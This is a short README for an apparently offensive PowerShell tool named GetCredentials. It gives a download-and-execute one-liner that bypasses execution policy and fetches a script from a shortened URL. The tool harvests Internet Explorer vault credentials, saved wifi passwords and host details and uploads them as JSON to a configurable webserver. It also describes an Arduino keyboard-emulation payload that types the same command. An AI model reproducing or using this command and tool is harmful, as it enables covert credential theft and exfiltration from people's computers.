# GetCredentials
Usage: powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://bit.ly/2El9Fyw’)"
Will get wifi credentials

.DESCRIPTION
Performs the following task
    - Get credentials from IE vault
    - Get saved wifi passwords
    - Get host information
    - Write to file to C:\temp\ (if folder exsists)
    - Upload with json to webserver "http://192.168.1.174" by default 
    
 .PARAMETERS
    -output
        Enter output path
        Example: ./GetCredentials.ps1 -output C:\windows\temp\out
    -url
        Enter url where the data will be sent as a json request
        Example: ./GetCredentials.ps1 -url http://192.168.1.174/data

Keyboard_payload.ino works for Arduino leonard with swedish keyboard
Will run IEX (New-Object Net.WebClient).DownloadString("https://bit.ly/2El9Fyw")

#Todo
Figure out how to pass parameters while using IEX to be able to modify -output and -url parameter
